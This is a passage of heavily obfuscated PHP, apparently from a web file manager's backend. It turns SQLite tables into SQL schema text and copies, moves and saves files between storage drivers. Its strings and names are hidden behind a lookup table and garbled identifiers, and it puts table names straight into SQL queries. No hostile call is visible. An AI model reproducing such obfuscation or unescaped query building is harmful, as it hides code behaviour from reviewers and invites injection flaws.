$Éä…—[$¡İ²ğ˜Î[$ğÊ¾Ï´[1191]]] = array($ğÊ¾Ï´[1195] => $¡İ²ğ˜Î[$ğÊ¾Ï´[1191]], $ğÊ¾Ï´[1194] => array($¡İ²ğ˜Î[$ğÊ¾Ï´[1193]]), $ğÊ¾Ï´[1196] => $¡İ²ğ˜Î[$ğÊ¾Ï´[1197]] == $ğÊ¾Ï´[91] ? 0 : 1); } $¼’¹ğßí = array(); foreach ($Éä…— as $¡İ²ğ˜Î) { $¨†üĞµª = $¡İ²ğ˜Î[$ğÊ¾Ï´[1195]] == $ğÊ¾Ï´[1192]; $Íòıê•” = array($ğÊ¾Ï´[1198], $¡İ²ğ˜Î[$ğÊ¾Ï´[1196]] == $ğÊ¾Ï´[91] && !$¨†üĞµª ? $ğÊ¾Ï´[1199] : $ğÊ¾Ï´[12], $ğÊ¾Ï´[1200], $ğÊ¾Ï´[1201] . $íËØ·š© . $ğÊ¾Ï´[11] . ($¨†üĞµª ? $ğÊ¾Ï´[1202] : $¡İ²ğ˜Î[$ğÊ¾Ï´[1195]]) . $ğÊ¾Ï´[121], $ğÊ¾Ï´[1203], $ğÊ¾Ï´[121] . $íËØ·š© . $ğÊ¾Ï´[121], $ğÊ¾Ï´[1204] . implode($ğÊ¾Ï´[1205], $¡İ²ğ˜Î[$ğÊ¾Ï´[1194]]) . $ğÊ¾Ï´[1206]); $¼’¹ğßí[] = implode($ğÊ¾Ï´[53], $Íòıê•”) . $ğÊ¾Ï´[74]; } $¼î¶Ññ = array(); $û«óĞ€í = array($ğÊ¾Ï´[1207] => $ğÊ¾Ï´[1208], $ğÊ¾Ï´[1208] => $ğÊ¾Ï´[1208], $ğÊ¾Ï´[365] => $ğÊ¾Ï´[392], $ğÊ¾Ï´[364] => $ğÊ¾Ï´[392]); foreach ($ƒø·Îƒñ as $¡İ²ğ˜Î) { $Íòıê•” = array($ğÊ¾Ï´[121] . $¡İ²ğ˜Î[$ğÊ¾Ï´[1209]] . $ğÊ¾Ï´[121], isset($û«óĞ€í[$¡İ²ğ˜Î[$ğÊ¾Ï´[1210]]]) ? $û«óĞ€í[$¡İ²ğ˜Î[$ğÊ¾Ï´[1210]]] : $¡İ²ğ˜Î[$ğÊ¾Ï´[1211]], $¡İ²ğ˜Î[$ğÊ¾Ï´[1212]] == $ğÊ¾Ï´[986] ? $ğÊ¾Ï´[1213] : $ğÊ¾Ï´[1214], $¡İ²ğ˜Î[$ğÊ¾Ï´[1209]] == $É´§é’ä ? $ğÊ¾Ï´[1215] : $ğÊ¾Ï´[12], $¡İ²ğ˜Î[$ğÊ¾Ï´[1037]] ? strtoupper(str_replace($ğÊ¾Ï´[11], $ğÊ¾Ï´[12], $¡İ²ğ˜Î[$ğÊ¾Ï´[1037]])) : $ğÊ¾Ï´[12]); $¼î¶Ññ[] = trim(implode($ğÊ¾Ï´[53], $Íòıê•”)); } $”áûØ¶Å = array($ğÊ¾Ï´[1216] . $íËØ·š© . $ğÊ¾Ï´[1217], $ğÊ¾Ï´[1218] . $íËØ·š© . $ğÊ¾Ï´[1219], implode($ğÊ¾Ï´[50] . PHP_EOL, $¼î¶Ññ), $ğÊ¾Ï´[1034]); $ÆˆÆêã = implode(PHP_EOL, array_merge($”áûØ¶Å, $¼’¹ğßí)); if ($Äô˜ÃŸ && $Äô˜ÃŸ == $ğÊ¾Ï´[13]) { return $ÆˆÆêã; } $Õ™»ş–¶ = array($ğÊ¾Ï´[894] => $Å³­ß¯Â, $ğÊ¾Ï´[13] => $ÆˆÆêã); return $Äô˜ÃŸ ? $Õ™»ş–¶[$Äô˜ÃŸ] : $Õ™»ş–¶; } public function sqlFromSqlite($ú«³çŸÍ, $ÔîÒÌ«… = '') { $Ü„³Ø…è =& $_SERVER[¡¬ıÜ ƒ]; $Ú«ı¡ä = $this->model()->db(); $³´ªö‘ß = "\x50\x52\101\x47\x4d\x41\x20\124\101\x42\x4c\105\137\x49\x4e\x46\117\x20\50\x27{$ú«³çŸÍ}\47\x29"; $“È€øîã = "\123\105\x4c\105\103\124\x20\52\x20\x46\x52\x4f\x4d\x20\x73\161\154\x69\x74\145\x5f\155\141\163\164\x65\x72\x20\x57\x48\105\122\x45\x20\x74\x62\x6c\x5f\x6e\141\155\x65\40\75\40\x27{$ú«³çŸÍ}\47"; $œ‘Ïä” = $Ú«ı¡ä->query($³´ªö‘ß); if (empty($œ‘Ïä”)) { $ì¶ÅÏşÅ = array($Ü„³Ø…è[894] => $Ü„³Ø…è[12], $Ü„³Ø…è[13] => $Ü„³Ø…è[12]); return $ÔîÒÌ«… ? $ì¶ÅÏşÅ[$ÔîÒÌ«…] : $ì¶ÅÏşÅ; } $åÁŞ±–¾ = $Ú«ı¡ä->query($“È€øîã); $—ÎÚ¡¸° = $—³ı¦ãÍ = array(); foreach ($åÁŞ±–¾ as $”–Äé÷Ÿ) { if ($”–Äé÷Ÿ[$Ü„³Ø…è[33]] == $Ü„³Ø…è[358]) { $—ÎÚ¡¸°[] = $”–Äé÷Ÿ[$Ü„³Ø…è[1220]]; } else { $—³ı¦ãÍ[$”–Äé÷Ÿ[$Ü„³Ø…è[32]]] = $”–Äé÷Ÿ[$Ü„³Ø…è[1220]]; } } $ÌşÄ•Ûô = array_merge(array($Ü„³Ø…è[1216] . $ú«³çŸÍ . $Ü„³Ø…è[121]), $—ÎÚ¡¸°, array_values($—³ı¦ãÍ)); $ÌşÄ•Ûô = implode($Ü„³Ø…è[74] . PHP_EOL, $ÌşÄ•Ûô) . $Ü„³Ø…è[74]; if ($ÔîÒÌ«… && $ÔîÒÌ«… == $Ü„³Ø…è[13]) { return $ÌşÄ•Ûô; } $ˆÍğë¹ß = array(); foreach ($—³ı¦ãÍ as $î®†€³ì => $İËßØÉÁ) { $Æ™ãÜîß = str_replace($Ü„³Ø…è[1221] . $ú«³çŸÍ . $Ü„³Ø…è[11], $Ü„³Ø…è[12], $î®†€³ì); $Æ™ãÜîß = str_replace($ú«³çŸÍ . $Ü„³Ø…è[11], $Ü„³Ø…è[12], $î®†€³ì); $œ ¼Ô· = str_replace(array($Ü„³Ø…è[121], $Ü„³Ø…è[1045]), $Ü„³Ø…è[463], substr($İËßØÉÁ, stripos($İËßØÉÁ, $Ü„³Ø…è[339]))); $ˆÍğë¹ß[$Æ™ãÜîß] = $œ ¼Ô·; } $¼ê€ü×Ò = array(); $»Š¶ú‡Õ = array($Ü„³Ø…è[1208] => $Ü„³Ø…è[1222], $Ü„³Ø…è[392] => $Ü„³Ø…è[1223]); $Ä¥·îœì = $áô‚Û‡“ = $Ü„³Ø…è[12]; foreach ($œ‘Ïä” as $”–Äé÷Ÿ) { if ($”–Äé÷Ÿ[$Ü„³Ø…è[57]] == $Ü„³Ø…è[91]) { $Ä¥·îœì = $”–Äé÷Ÿ[$Ü„³Ø…è[32]]; } $ºÃº¢í = $”–Äé÷Ÿ[$Ü„³Ø…è[33]]; if ($ºÃº¢í == $Ü„³Ø…è[1224] && isset($ˆÍğë¹ß[$”–Äé÷Ÿ[$Ü„³Ø…è[32]]])) { $ºÃº¢í = $Ü„³Ø…è[1225]; } $˜ÆèÉôÑ = array($Ü„³Ø…è[463] . $”–Äé÷Ÿ[$Ü„³Ø…è[32]] . $Ü„³Ø…è[463], _get($»Š¶ú‡Õ, $ºÃº¢í, $ºÃº¢í), $”–Äé÷Ÿ[$Ü„³Ø…è[35]] == $Ü„³Ø…è[91] ? $Ü„³Ø…è[1213] : $Ü„³Ø…è[1226] . $”–Äé÷Ÿ[$Ü„³Ø…è[56]], $”–Äé÷Ÿ[$Ü„³Ø…è[57]] == $Ü„³Ø…è[91] ? $Ü„³Ø…è[1227] : $Ü„³Ø…è[12]); $¼ê€ü×Ò[] = trim(implode($Ü„³Ø…è[53], $˜ÆèÉôÑ)); } foreach ($ˆÍğë¹ß as $Æ™ãÜîß => $œ ¼Ô·) { if ($Æ™ãÜîß == $Ü„³Ø…è[1202]) { $áÁİ£¨Š = $áô‚Û‡“ = $Ü„³Ø…è[1228] . $Ä¥·îœì . $Ü„³Ø…è[1229]; } else { $áÁİ£¨Š = (stripos($Æ™ãÜîß, $Ü„³Ø…è[11]) ? $Ü„³Ø…è[1230] : $Ü„³Ø…è[12]) . ($Ü„³Ø…è[1231] . $Æ™ãÜîß . $Ü„³Ø…è[1232] . $œ ¼Ô·); } $¼ê€ü×Ò[] = $áÁİ£¨Š; } if ($Ä¥·îœì && !$áô‚Û‡“) { $¼ê€ü×Ò = array_merge(array($Ü„³Ø…è[1228] . $Ä¥·îœì . $Ü„³Ø…è[1229]), $¼ê€ü×Ò); } $­ñÌù™À = array($Ü„³Ø…è[1233] . $ú«³çŸÍ . $Ü„³Ø…è[1234], $Ü„³Ø…è[1235] . $ú«³çŸÍ . $Ü„³Ø…è[1236], implode($Ü„³Ø…è[50] . PHP_EOL, $¼ê€ü×Ò), $Ü„³Ø…è[1237]); $›âğÂ® = implode(PHP_EOL, $­ñÌù™À); if ($ÔîÒÌ«… && $ÔîÒÌ«… == $Ü„³Ø…è[894]) { return $›âğÂ®; } $ì¶ÅÏşÅ = array($Ü„³Ø…è[894] => $›âğÂ®, $Ü„³Ø…è[13] => $ÌşÄ•Ûô); return $ÔîÒÌ«… ? $ì¶ÅÏşÅ[$ÔîÒÌ«…] : $ì¶ÅÏşÅ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($âè–ÁË, $à™áÎ¡’) { $ü¾ÏøÅğ =& $_SERVER[¡¬ıÜ ƒ]; $šÑÔÊ‹‡ = $à™áÎ¡’; $GLOBALS[$ü¾ÏøÅğ[1238]] = $ü¾ÏøÅğ[1239] . $âè–ÁË; Hook::trigger($ü¾ÏøÅğ[1239] . $âè–ÁË . $ü¾ÏøÅğ[1240], $šÑÔÊ‹‡); $˜äàÍ¯µ = self::driverMake($à™áÎ¡’[0]); if (!$˜äàÍ¯µ) { return !1; } if (method_exists($˜äàÍ¯µ, $âè–ÁË)) { $ªõ™Õ° = @call_user_func_array(array($˜äàÍ¯µ, $âè–ÁË), $à™áÎ¡’); } else { if (method_exists($˜äàÍ¯µ, $ü¾ÏøÅğ[1241])) { $ªõ™Õ° = @call_user_func_array(array($˜äàÍ¯µ, $âè–ÁË), $à™áÎ¡’); } else { if (method_exists(self, $âè–ÁË)) { $ªõ™Õ° = @call_user_func_array(array(self, $âè–ÁË), $à™áÎ¡’); } else { $ªõ™Õ° = call_user_func_array(array(parent, $âè–ÁË), $à™áÎ¡’); } } } Hook::trigger($ü¾ÏøÅğ[1239] . $âè–ÁË . $ü¾ÏøÅğ[1242], $šÑÔÊ‹‡, $ªõ™Õ°); return $ªõ™Õ°; } public static function init($¶Ş‰ã±÷) { return self::driverMake($¶Ş‰ã±÷); } public static function copy($šôÛ©Õú, $ÒÆõíí˜, $Íğ„÷¨ = false, $Æª ”Ğ® = false) { return self::copyMoveStart($šôÛ©Õú, $ÒÆõíí˜, $Íğ„÷¨, $_SERVER[¡¬ıÜ ƒ][623], $Æª ”Ğ®); } public static function move($î˜è³¯, $’í³Ë„©, $ôàÂ¯Óº = false, $†áıÑÙû = false) { return self::copyMoveStart($î˜è³¯, $’í³Ë„©, $ôàÂ¯Óº, $_SERVER[¡¬ıÜ ƒ][625], $†áıÑÙû); } public static function copyMoveChildren($¢®³¶Ÿ, $ÎçÜÌ…ğ, $Áû¨ÚŠ¸ = "\143\x6f\x70\x79", $¤¤ç = REPEAT_REPLACE) { $­©…½¶¯ =& $_SERVER[¡¬ıÜ ƒ]; $åúÁ½’Œ = $¢®³¶Ÿ; $İ­øŸÅÏ = self::driverMake($¢®³¶Ÿ); $Ğ©‹é”å = $İ­øŸÅÏ->listPath($¢®³¶Ÿ, !0); $¨·ÓÀñÚ = array_merge($Ğ©‹é”å[$­©…½¶¯[86]], $Ğ©‹é”å[$­©…½¶¯[85]]); foreach ($¨·ÓÀñÚ as $­Ñ°è¸Å) { self::copyMoveStart($­Ñ°è¸Å[$­©…½¶¯[87]], $ÎçÜÌ…ğ, $¤¤ç, $Áû¨ÚŠ¸, !1); } if ($Áû¨ÚŠ¸ == $­©…½¶¯[625]) { self::remove($åúÁ½’Œ); } } private static function copyMoveStart($‘œˆ¤‘ , $¦’ÏèÁÄ, $¢½ğğ¾¥, $àÕè”€, $Ÿ¥³²ĞÀ) { $Ò§¨è’‡ =& $_SERVER[¡¬ıÜ ƒ]; $“–³ÁŸõ = array($‘œˆ¤‘ , $¦’ÏèÁÄ, $¢½ğğ¾¥, $Ÿ¥³²ĞÀ); Hook::trigger($Ò§¨è’‡[1239] . $àÕè”€ . $Ò§¨è’‡[1240], $“–³ÁŸõ); $ì¶ÇÎÒŸ = self::copyMove($‘œˆ¤‘ , $¦’ÏèÁÄ, $¢½ğğ¾¥, $àÕè”€, $Ÿ¥³²ĞÀ); Hook::trigger($Ò§¨è’‡[1239] . $àÕè”€ . $Ò§¨è’‡[1242], $“–³ÁŸõ, $ì¶ÇÎÒŸ); return $ì¶ÇÎÒŸ; } public static function saveFile($¶é³³“ò, $ıˆÜù™™, $”›Ï··Â = true) { $¨Œ°ÑŸë =& $_SERVER[¡¬ıÜ ƒ]; $ÍÇ—ä¿ = self::info($ıˆÜù™™); $ş÷å¾¿ = self::driverMake($¶é³³“ò); $´²¦ŸïÀ = self::driverMake($ıˆÜù™™); $ñ§“úö = !1; if ($´²¦ŸïÀ->pathParse[$¨Œ°ÑŸë[1243]]) { $ñ§“úö = $´²¦ŸïÀ; $Ç«¾¨±Û = $´²¦ŸïÀ->pathParse[$¨Œ°ÑŸë[1243]]; $´²¦ŸïÀ = self::driverMake($Ç«¾¨±Û); } if ($ş÷å¾¿->pathParse[$¨Œ°ÑŸë[1243]]) { $ŸÙ÷æä = $ş÷å¾¿->pathParse[$¨Œ°ÑŸë[1243]]; $ş÷å¾¿ = self::driverMake($ŸÙ÷æä); } $¹ğ±İ£ê = $´²¦ŸïÀ->pathFather($ıˆÜù™™); $ªüÏÎÂ = !0; if (!$”›Ï··Â && self::driverIsSame($ş÷å¾¿, $´²¦ŸïÀ)) { $ªüÏÎÂ = !1; } $½•¤§Ë¶ = self::copyFile($ş÷å¾¿, $¶é³³“ò, $´²¦ŸïÀ, $¹ğ±İ£ê, $ÍÇ—ä¿[$¨Œ°ÑŸë[32]], $ªüÏÎÂ); if ($ñ§“úö) { $½•¤§Ë¶ = $ñ§“úö->getPathOuter($½•¤§Ë¶); } return $½•¤§Ë¶; } private static function copyMove($¿€ŒŒ¾Ú, $õãã×Ÿ, $¥¿»ÚŞÚ, $èˆê÷á, $Ê‚æáí = false) { $—¢Ú’• =& $_SERVER[¡¬ıÜ ƒ]; if (!$¿€ŒŒ¾Ú || $¿€ŒŒ¾Ú == $—¢Ú’•[8] || !$õãã×Ÿ) { return !1; } ignore_timeout(); $­—‹öë¢ = self::driverMake($¿€ŒŒ¾Ú); $¾ı¡¿’ = self::driverMake($õãã×Ÿ); $µüçœÇ = $èˆê÷á == $—¢Ú’•[625]; $ÕùöÄ  = !1; if ($¾ı¡¿’->pathParse[$—¢Ú’•[1243]]) { $ÕùöÄ  = $¾ı¡¿’; $õãã×Ÿ = $¾ı¡¿’->pathParse[$—¢Ú’•[1243]]; $¾ı¡¿’ = self::driverMake($õãã×Ÿ); } if ($­—‹öë¢->pathParse[$—¢Ú’•[1243]]) { $¿€ŒŒ¾Ú = $­—‹öë¢->pathParse[$—¢Ú’•[1243]]; $­—‹öë¢ = self::driverMake($¿€ŒŒ¾Ú); } self::check($­—‹öë¢, $¿€ŒŒ¾Ú, $¾ı¡¿’, $õãã×Ÿ); Hook::trigger($—¢Ú’•[1244], $­—‹öë¢, $¿€ŒŒ¾Ú, $¾ı¡¿’, $õãã×Ÿ); $Óö³²ø = self::driverIsSame($­—‹öë¢, $¾ı¡¿’); if ($Óö³²ø) { if ($èˆê÷á == $—¢Ú’•[625] && !method_exists($¾ı¡¿’, $—¢Ú’•[1245]) && trim($õãã×Ÿ, $—¢Ú’•[8]) == trim($¾ı¡¿’->pathFather($¿€ŒŒ¾Ú), $—¢Ú’•[8])) { if ($­—‹öë¢->pathThis($¿€ŒŒ¾Ú) != $Ê‚æáí && !$­—‹öë¢->isOsDriver()) { return $­—‹öë¢->rename($¿€ŒŒ¾Ú, $Ê‚æáí); } return $¾ı¡¿’->getPathOuter($¿€ŒŒ¾Ú); } if (method_exists($¾ı¡¿’, $èˆê÷á)) { return $¾ı¡¿’->{$èˆê÷á}($¿€ŒŒ¾Ú, $õãã×Ÿ, $¥¿»ÚŞÚ, $Ê‚æáí); } } if ($Óö³²ø && $èˆê÷á == $—¢Ú’•[625] && $¾ı¡¿’->getType() == $—¢Ú’•[109]) { $ä€šÙ×‘ = $¾ı¡¿’->movePath($¿€ŒŒ¾Ú, $õãã×Ÿ, $Ê‚æáí); if ($ä€šÙ×‘) { return $ä€šÙ×‘; } } $ÒÃÏ’Ïİ = $­—‹öë¢->isFile($¿€ŒŒ¾Ú); if (!$ÒÃÏ’Ïİ && $¾ı¡¿’->getType() == $—¢Ú’•[837] && $­—‹öë¢->getType() == $—¢Ú’•[109]) { $ä€šÙ×‘ = $¾ı¡¿’->copyFolderFromIO($­—‹öë¢, $¿€ŒŒ¾Ú, $õãã×Ÿ, $¥¿»ÚŞÚ, $µüçœÇ, $Ê‚æáí); } else { $ä€šÙ×‘ = self::copyPath($­—‹öë¢, $¿€ŒŒ¾Ú, $¾ı¡¿’, $õãã×Ÿ, $¥¿»ÚŞÚ, $µüçœÇ, $ÒÃÏ’Ïİ, $Ê‚æáí); } if ($ä€šÙ×‘ && $µüçœÇ) { $­—‹öë¢->remove($¿€ŒŒ¾Ú); } if ($ÕùöÄ ) { $ä€šÙ×‘ = $ÕùöÄ ->getPathOuter($ä€šÙ×‘); } return $ä€šÙ×‘; } private static function check($íıîÁìˆ, $ÍÚÉîÍ, $Æ¸§³Š, &$ƒö¯ş˜ı) { $ÓõÀ×üã =& $_SERVER[¡¬ıÜ ƒ]; if (self::driverIsSame($íıîÁìˆ, $Æ¸§³Š) && $íıîÁìˆ->isFolder($ÍÚÉîÍ) && $íıîÁìˆ->isParentOf($ÍÚÉîÍ, $ƒö¯ş˜ı)) { show_json(LNG($ÓõÀ×üã[1246]), !1); } if (!$íıîÁìˆ->exist($ÍÚÉîÍ)) { show_json(LNG($ÓõÀ×üã[108]), !1); } } private static function copyPath($¿Å³ËÑĞ, $·†Î×ÜÕ, $ùâ¤‡¬¢, $¶ıîòé­, $¡„Ëêåü, $¿¸ƒÕò¯, $ŞÉÊêÅÙ, $á¨¡¸¶ñ = false, $Ø£¼×èæ = true) { $‚©™ƒ•³ =& $_SERVER[¡¬ıÜ ƒ]; $İ‘ë‘«Å = empty($á¨¡¸¶ñ) && $á¨¡¸¶ñ !== $‚©™ƒ•³[230] ? $¿Å³ËÑĞ->pathThis($·†Î×ÜÕ) : $á¨¡¸¶ñ; if ($¡„Ëêåü) { $ßî¿¥ûÕ = $ùâ¤‡¬¢->fileNameExist($¶ıîòé­, $İ‘ë‘«Å); $îÖò§´ş = $İ‘ë‘«Å; $İ‘ë‘«Å = $ùâ¤‡¬¢->fileNameAuto($¶ıîòé­, $İ‘ë‘«Å, $¡„Ëêåü, !$ŞÉÊêÅÙ); if (!$ßî¿¥ûÕ || $îÖò§´ş != $İ‘ë‘«Å) { $¡„Ëêåü = !1; } if ($Ø£¼×èæ && !$¡„Ëêåü) { $ùâ¤‡¬¢->_data[$‚©™ƒ•³[1247]] = !0; } } if ($ŞÉÊêÅÙ) { return self::copyFile($¿Å³ËÑĞ, $·†Î×ÜÕ, $ùâ¤‡¬¢, $¶ıîòé­, $İ‘ë‘«Å, $¿¸ƒÕò¯); } if ($¡„Ëêåü == REPEAT_RENAME_FOLDER) { $¡„Ëêåü = !1; } $ŸòğÑ = rtrim($¶ıîòé­, $‚©™ƒ•³[8]) . $‚©™ƒ•³[8] . $İ‘ë‘«Å; $½«°÷®  = $ùâ¤‡¬¢->mkdir($ùâ¤‡¬¢->getPath($ŸòğÑ), $¡„Ëêåü); $¶ıîòé­ = $ùâ¤‡¬¢->getPathInner($½«°÷® ); $‚³Äë›© = $¿Å³ËÑĞ->listPath($·†Î×ÜÕ, !0); $‚³Äë›© = is_array($‚³Äë›©) ? $‚³Äë›© : array($‚©™ƒ•³[86] => array(), $‚©™ƒ•³[85] => array()); $Ÿ¾üŠ€Â = array_merge($‚³Äë›©[$‚©™ƒ•³[86]], $‚³Äë›©[$‚©™ƒ•³[85]]); foreach ($Ÿ¾üŠ€Â as $Á“˜‚İÁ) { $ÚáÕ¢Äô = $Á“˜‚İÁ[$‚©™ƒ•³[33]] == $‚©™ƒ•³[232]; $·†Î×ÜÕ = $¿Å³ËÑĞ->getPathInner($Á“˜‚İÁ[$‚©™ƒ•³[87]]); $Å›Å¶ª— = self::copyPath($¿Å³ËÑĞ, $·†Î×ÜÕ, $ùâ¤‡¬¢, $¶ıîòé­, $¡„Ëêåü, $¿¸ƒÕò¯, $ÚáÕ¢Äô, !1, !1); if (!$Å›Å¶ª—) { IO::errorTips($‚©™ƒ•³[1248] . $·†Î×ÜÕ . $‚©™ƒ•³[73] . $¶ıîòé­); } } self::copyMoveKeepInfo($¿Å³ËÑĞ, $·†Î×ÜÕ, $½«°÷® ); return $½«°÷® ; } private static function copyFile($†à¿å½ˆ, $ç¡Ïüç½, $®ï”®ä, $ğ˜×´»‘, $ÙĞ´, $ÊÔ©åµ˜) { $†¬ıÃİË =& $_SERVER[¡¬ıÜ ƒ]; $ğ˜×´»‘ = $®ï”®ä->getPath(rtrim($ğ˜×´»‘, $†¬ıÃİË[8]) . $†¬ıÃİË[8] . $ÙĞ´); $‰¬»ŒÇÒ = $†¬ıÃİË[1249] . time() . rand_string(5); Hook::trigger($†¬ıÃİË[1250], $†à¿å½ˆ, $ç¡Ïüç½, $®ï”®ä, $ğ˜×´»‘, $ÙĞ´, $‰¬»ŒÇÒ); if (self::driverIsSame($†à¿å½ˆ, $®ï”®ä)) { if ($ÊÔ©åµ˜) { $º•¯˜¿¼ = $®ï”®ä->moveFile($ç¡Ïüç½, $ğ˜×´»‘); } else { $º•¯˜¿¼ = $®ï”®ä->copyFile($ç¡Ïüç½, $ğ˜×´»‘); } Hook::trigger($†¬ıÃİË[1251], $†à¿å½ˆ, $ç¡Ïüç½, $®ï”®ä, $ğ˜×´»‘, $ÙĞ´, $º•¯˜¿¼); self::copyMoveKeepInfo($†à¿å½ˆ, $ç¡Ïüç½, $º•¯˜¿¼); return $º•¯˜¿¼; } $Û¿ı¨ø¾ = TEMP_FILES; if ($GLOBALS[$†¬ıÃİË[6]][$†¬ıÃİË[92]][$†¬ıÃİË[885]]) { $Û¿ı¨ø¾ = $GLOBALS[$†¬ıÃİË[6]][$†¬ıÃİË[92]][$†¬ıÃİË[885]]; } $‚Œ³­Àè = $Û¿ı¨ø¾; mk_dir($‚Œ³­Àè); $ê¸ÃÜş¯ = $‚Œ³­Àè . $‰¬»ŒÇÒ; $ºôşœ¬ = $ê¸ÃÜş¯; $ê¸ÃÜş¯ = $†à¿å½ˆ->download($ç¡Ïüç½, $ê¸ÃÜş¯); $ê¸ÃÜş¯ = $†à¿å½ˆ->iconvApp($ê¸ÃÜş¯); if (substr($ê¸ÃÜş¯, strlen($Û¿ı¨ø¾)) == $Û¿ı¨ø¾) { $ÊÔ©åµ˜ = !0; } $º•¯˜¿¼ = $®ï”®ä->upload($ğ˜×´»‘, $ê¸ÃÜş¯, $ÊÔ©åµ˜); self::remove($ºôşœ¬); Hook::trigger($†¬ıÃİË[1251], $†à¿å½ˆ, $ç¡Ïüç½, $®ï”®ä, $ğ˜×´»‘, $ÙĞ´, $º•¯˜¿¼); self::copyMoveKeepInfo($†à¿å½ˆ, $ç¡Ïüç½, $º•¯˜¿¼); return $º•¯˜¿¼; } private static function copyMoveKeepInfo($–¹ĞÔˆ¸, $œ—‹Š§Ï, $÷÷ş±×à) { if (!$÷÷ş±×à) { return; } $£µ›Ğ€Ò = $–¹ĞÔˆ¸->info($œ—‹Š§Ï); if (!is_array($£µ›Ğ€Ò)) { return; } IO::setModifyTime($÷÷ş±×à, $£µ›Ğ€Ò[$_SERVER[¡¬ıÜ ƒ][88]]); } public static function pathFather($®çŠñÎÅ) { $Ì­ÊğÑ = IO::init($®çŠñÎÅ); $ÍŒ—Îºƒ = $Ì­ÊğÑ->pathFather($Ì­ÊğÑ->path); return $Ì­ÊğÑ->getPathOuter($ÍŒ—Îºƒ); } public static function fileOut($°Û²ê¶±, $ó­ŞˆÍÁ = false, $õ‰˜¡»‹ = false, $ÀüÂ™™Œ = '') { $€¹–ğ¡ = self::driverMake($°Û²ê¶±); if ($€¹–ğ¡->isFileOutServer()) { return $€¹–ğ¡->fileOutServer($°Û²ê¶±, $ó­ŞˆÍÁ, $õ‰˜¡»‹, $ÀüÂ™™Œ); } return $€¹–ğ¡->fileOut($°Û²ê¶±, $ó­ŞˆÍÁ, $õ‰˜¡»‹, $ÀüÂ™™Œ); } public static function fileOutImage($Ö×ß˜š, $îª½¼…Ÿ = 250) { $Á—öóà = array(250, 600, 1200, 2000, 3000, 5000); for ($²‹‹´ˆë = 0; $²‹‹´ˆë < count($Á—öóà); $²‹‹´ˆë++) { if ($²‹‹´ˆë == 0 && $îª½¼…Ÿ <= $Á—öóà[$²‹‹´ˆë]) { $îª½¼…Ÿ = $Á—öóà[$²‹‹´ˆë]; break; } else { if ($îª½¼…Ÿ > $Á—öóà[$²‹‹´ˆë - 1] && $îª½¼…Ÿ <= $Á—öóà[$²‹‹´ˆë]) { $îª½¼…Ÿ = $Á—öóà[$²‹‹´ˆë]; break; } else { if ($²‹‹´ˆë == count($Á—öóà) - 1 && $îª½¼…Ÿ > $Á—öóà[$²‹‹´ˆë]) { $îª½¼…Ÿ = $Á—öóà[$²‹‹´ˆë]; break; } } } } $“œŒÆÂ = self::driverMake($Ö×ß˜š); if ($“œŒÆÂ->isFileOutServer()) { return $“œŒÆÂ->fileOutImageServer($Ö×ß˜š, $îª½¼…Ÿ); } return $“œŒÆÂ->fileOutImage($Ö×ß˜š, $îª½¼…Ÿ); } private static function driverIsSame($°ûŒ»š, $ŸıŠ““ë) { $Ü¯—ÅŞĞ =& $_SERVER[¡¬ıÜ ƒ]; $ô¿˜š’ = $°ûŒ»š->getType(); $×òã™ê­ = $ŸıŠ““ë->getType(); if ($ô¿˜š’ != $×òã™ê­) { return !1; } if ($ô¿˜š’ == $Ü¯—ÅŞĞ[837]) { return !0; } if ($ô¿˜š’ == $Ü¯—ÅŞĞ[109]) { return !0; } if ($°ûŒ»š->pathDriver == $ŸıŠ““ë->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ñè­¤ë, $áôñáÌ) { $í‚Á÷ëô =& $_SERVER[¡¬ıÜ ƒ]; if (!IO::exist($Ñè­¤ë)) { return !1; } if (!IO::exist($áôñáÌ)) { IO::mkdir($áôñáÌ); } $Ïóïğú = array_to_keyvalue(self::listAllSimple($Ñè­¤ë), $í‚Á÷ëô[87]); $»‰ªµğĞ = array_to_keyvalue(self::listAllSimple($áôñáÌ), $í‚Á÷ëô[87]); $‹„ŸâöØ = array(); $Àş°’‚ = array(); foreach ($Ïóïğú as $Ã³Ùû’‰ => $ê“ú¤óŒ) { if (isset($»‰ªµğĞ[$Ã³Ùû’‰])) { if ($ê“ú¤óŒ[$í‚Á÷ëô[78]] == 1) { continue; } if ($»‰ªµğĞ[$Ã³Ùû’‰][$í‚Á÷ëô[79]] == $ê“ú¤óŒ[$í‚Á÷ëô[79]]) { continue; } } if ($ê“ú¤óŒ[$í‚Á÷ëô[78]] == 1) { $Àş°’‚[] = $áôñáÌ . $í‚Á÷ëô[8] . trim($Ã³Ùû’‰, $í‚Á÷ëô[8]); continue; } $Îä’¸¼ä = strstr(trim($Ã³Ùû’‰, $í‚Á÷ëô[8]), $í‚Á÷ëô[8]) ? get_path_father($Ã³Ùû’‰) : $í‚Á÷ëô[12]; $‹„ŸâöØ[] = array($í‚Á÷ëô[1252] => $ê“ú¤óŒ[$í‚Á÷ëô[89]], $í‚Á÷ëô[1253] => rtrim($áôñáÌ, $í‚Á÷ëô[8]) . $í‚Á÷ëô[8] . $Îä’¸¼ä, $í‚Á÷ëô[1254] => $ê“ú¤óŒ); } $·¦Áùà = array($í‚Á÷ëô[232] => $‹„ŸâöØ, $í‚Á÷ëô[78] => $Àş°’‚); Hook::trigger($í‚Á÷ëô[1255], $Ñè­¤ë, $áôñáÌ, $·¦Áùà); foreach ($Àş°’‚ as $ê“ú¤óŒ) { IO::mkdir($ê“ú¤óŒ); } foreach ($‹„ŸâöØ as $ê“ú¤óŒ) { IO::copy($ê“ú¤óŒ[$í‚Á÷ëô[1252]], $ê“ú¤óŒ[$í‚Á÷ëô[1253]], REPEAT_REPLACE); } } public static function fileSubstr($ù¾£¼¿, $ëÒ˜Ä»°, $ÖµÏ³ò = false) { $ş²¨İÔ¾ =& $_SERVER[¡¬ıÜ ƒ]; $¼ıÛßØê = self::driverMake($ù¾£¼¿); $¯õ¡ƒ· = $¼ıÛßØê->size($ù¾£¼¿); $ß§ŒëÖû = $ëÒ˜Ä»°; $À€Ë¹¾õ = $ÖµÏ³ò; if ($ëÒ˜Ä»° < 0) { $ëÒ˜Ä»° = $¯õ¡ƒ· + $ëÒ˜Ä»°; } if ($ÖµÏ³ò === !1) { $ÖµÏ³ò = $¯õ¡ƒ· - $ëÒ˜Ä»°; } if ($ëÒ˜Ä»° + $ÖµÏ³ò > $¯õ¡ƒ·) { $ÖµÏ³ò = $¯õ¡ƒ· - $ëÒ˜Ä»°; } if (!$¯õ¡ƒ· && 